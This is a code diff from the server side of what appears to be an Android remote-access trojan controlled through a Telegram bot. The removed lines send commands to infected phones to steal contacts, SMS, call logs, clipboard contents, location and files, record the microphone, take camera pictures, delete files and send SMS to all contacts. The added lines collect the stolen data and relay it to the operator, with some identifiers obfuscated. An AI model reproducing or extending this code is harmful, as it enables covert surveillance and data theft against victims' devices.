-    const uuid = data.split(':')[1]
-    console.log(uuid)
-    if (commend == 'device') {
-        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
-            width: 10000,
-            chat_id: id,
-            message_id: msg.message_id,
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        {text: '𝘼𝙥𝙥𝙨', callback_data: `apps:${uuid}`},
-                        {text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤', callback_data: `device_info:${uuid}`}
-                    ],
-                    [
-                        {text: '𝙂𝙚𝙩 𝙛𝙞𝙡𝙚', callback_data: `file:${uuid}`},
-                        {text: '𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚', callback_data: `delete_file:${uuid}`}
-                    ],
-                    [
-                        {text: '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙', callback_data: `clipboard:${uuid}`},
-                        {text: '𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚', callback_data: `microphone:${uuid}`},
-                    ],
-                    [
-                        {text: '𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_main:${uuid}`},
-                        {text: '𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_selfie:${uuid}`}
-                    ],
-                    [
-                        {text: '𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `location:${uuid}`},
-                        {text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}`}
-                    ],
-                    [
-                        {text: '𝘾𝙖𝙡𝙡𝙨', callback_data: `calls:${uuid}`},
-                        {text: '𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨', callback_data: `contacts:${uuid}`}
-                    ],
-                    [
-                        {text: '𝙑𝙞𝙗𝙧𝙖𝙩𝙚', callback_data: `vibrate:${uuid}`},
-                        {text: '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `show_notification:${uuid}`}
-                    ],
-                    [
-                        {text: '𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨', callback_data: `messages:${uuid}`},
-                        {text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', callback_data: `send_message:${uuid}`}
-                    ],
-                    [
-                        {text: '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}`},
-                        {text: '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}`},
-                    ],
-                    [
-                        {
-                            text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨',
-                            callback_data: `send_message_to_all:${uuid}`
-                        }
-                    ],
-                ]
-            },
-            parse_mode: "HTML"
-        })
-    }
-    if (commend == 'calls') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('calls');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    if (commend == 'contacts') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('contacts');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    if (commend == 'messages') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('messages');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    if (commend == 'apps') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('apps');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    if (commend == 'device_info') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('device_info');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    if (commend == 'clipboard') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('clipboard');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    if (commend == 'camera_main') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('camera_main');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    if (commend == 'camera_selfie') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('camera_selfie');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    if (commend == 'location') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('location');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    if (commend == 'vibrate') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('vibrate');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    if (commend == 'stop_audio') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('stop_audio');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
-            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    if (commend == 'send_message') {
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id, '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
-            '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
-            {reply_markup: {force_reply: true}})
-        currentUuid = uuid
-    }
-    if (commend == 'send_message_to_all') {
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
-            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
-            {reply_markup: {force_reply: true}}
-        )
-        currentUuid = uuid
-    }
-    if (commend == 'file') {
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n' +
-            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
-            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
-        )
-        currentUuid = uuid
-    }
-    if (commend == 'delete_file') {
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n' +
-            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
-            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
-        )
-        currentUuid = uuid
-    }
-    if (commend == 'microphone') {
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
-            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
-            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
-        )
-        currentUuid = uuid
-    }
-    if (commend == 'toast') {
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚\n\n' +
-            '• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
-            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
-        )
-        currentUuid = uuid
-    }
-    if (commend == 'show_notification') {
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
-            '• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
-            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
-        )
-        currentUuid = uuid
-    }
-    if (commend == 'play_audio') {
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮\n\n' +
-            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
-            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
-        )
-        currentUuid = uuid
-    }
-});
-setInterval(function () {
-    appSocket.clients.forEach(function each(ws) {
-        ws.send('ping')
+// Cleanup old uploads
+setInterval(() => {
+  fs.readdir("uploads", (err, files) => {
+    files.forEach(file => {
+      fs.unlink(`uploads/${file}`, () => {});
     });
-    try {
-        axios.get(address).then(r => "")
-    } catch (e) {
+  });
+}, 300000);
+
+app.post("/upload", upload.single("file"), (req, res) => {
+  res.json({ status: "ok", file: req.file.filename });
+});
+
+app.post("/text", express.raw({ type: "*/*", limit: "10mb" }), (req, res) => {
+  const uuid = req.headers["x-uuid"];
+  const client = appClients.get(uuid);
+  if (client) {
+    appBot.sendMessage(id, `📄 <b>Text from ${client.model}</b>\n\n${req.body.toString()}`, { parse_mode: "HTML" });
+  }
+  res.json({ status: "ok" });
+});
+
+app.post("/location", express.json(), (req, res) => {
+  const uuid = req.headers["x-uuid"];
+  const client = appClients.get(uuid);
+  if (client) {
+    appBot.sendLocation(id, req.body.latitude, req.body.longitude, null, {
+      reply_markup: {
+        inline_keyboard: [[{ text: "🗺️ Open Maps", url: `https://maps.google.com/?q=${req.body.latitude},${req.body.longitude}` }]]
+      }
+    });
+  }
+  res.json({ status: "ok" });
+});
+
+// WebSocket Connection
+appServer.on("upgrade", function(request, socket, head) {
+  appSocket.handleUpgrade(request, socket, head, function(_0x4d0a4e) {
+    const uuid = Date.now().toString();
+    _0x4d0a4e.uuid = uuid;
+    appSocket.clients.forEach(function(_0x2d1f4e) {
+      if (_0x2d1f4e.readyState === WebSocket.OPEN) {
+        _0x2d1f4e.send(JSON.stringify({ type: "connected_devices", count: appSocket.clients.size }));
+      }
+    });
+    appBot.sendMessage(id, "°• 𝙉𝙚𝙬 𝘿𝙚𝙫𝙞𝙘𝙚 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 ✅\n\n• ʏᴏᴜʀ ᴛᴏᴛᴀʟ ᴅᴇᴠɪᴄᴇꜱ: <b>" + appSocket.clients.size + "</b>", {
+      "parse_mode": "HTML",
+      "reply_markup": {
+        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+        "resize_keyboard": true
+      }
+    });
+    _0x4d0a4e.on("message", function(_0x2c2f44) {
+      try {
+        const data = JSON.parse(_0x2c2f44);
+        if (data.type === "init") {
+          appClients.set(uuid, data);
+          let devicesList = "";
+          appClients.forEach((_0x1c6e24, _0x1f4e2a) => {
+            devicesList += `• <b>${_0x1c6e24.model}</b> (${_0x1c6e24.androidVersion})\n`;
+          });
+          appBot.sendMessage(id, `📱 <b>Connected Devices (${appClients.size}):</b>\n\n${devicesList}`, { parse_mode: "HTML" });
+        } else if (data.type === "response") {
+          const client = appClients.get(uuid);
+          if (client) {
+            appBot.sendDocument(id, Buffer.from(data.data), {
+              caption: `📱 Response from <b>${client.model}</b>\n\n${data.message || ""}`,
+              parse_mode: "HTML"
+            });
+          }
+        } else if (data.type === "file_list") {
+          // File Manager Response
+          handleFileList(uuid, data.path, data.files);
+        }
+      } catch (e) {
+        const message = _0x2c2f44.toString();
+        const parts = message.split(":");
+        if (parts[0] === "apps") {
+          const client = appClients.get(uuid);
+          appBot.sendMessage(id, `📱 <b>Installed Apps (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
+        } else if (parts[0] === "device_info") {
+          const client = appClients.get(uuid);
+          appBot.sendMessage(id, `ℹ️ <b>Device Info (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
+        } else if (parts[0] === "clipboard") {
+          const client = appClients.get(uuid);
+          appBot.sendMessage(id, `📋 <b>Clipboard (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
+        } else if (parts[0] === "contacts") {
+          const client = appClients.get(uuid);
+          appBot.sendMessage(id, `📞 <b>Contacts (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
+        } else if (parts[0] === "calls") {
+          const client = appClients.get(uuid);
+          appBot.sendMessage(id, `📲 <b>Call Logs (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
+        } else if (parts[0] === "messages") {
+          const client = appClients.get(uuid);
+          appBot.sendMessage(id, `💬 <b>SMS (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
+        }
+      }
+    });
+    _0x4d0a4e.on("close", function() {
+      appClients.delete(uuid);
+      appSocket.clients.forEach(function(_0x4e2d1f) {
+        if (_0x4e2d1f.readyState === WebSocket.OPEN) {
+          _0x4e2d1f.send(JSON.stringify({ type: "connected_devices", count: appSocket.clients.size }));
+        }
+      });
+      appBot.sendMessage(id, "°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝘿𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 ❌\n\n• 𝙔𝙤𝙪𝙧 𝙩𝙤𝙩𝙖𝙡 𝙙𝙚𝙫𝙞𝙘𝙚𝙨: <b>" + appSocket.clients.size + "</b>", {
+        "parse_mode": "HTML",
+        "reply_markup": {
+          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+          "resize_keyboard": true
+        }
+      });
+    });
+  });
+});
+
+// File Manager Handler
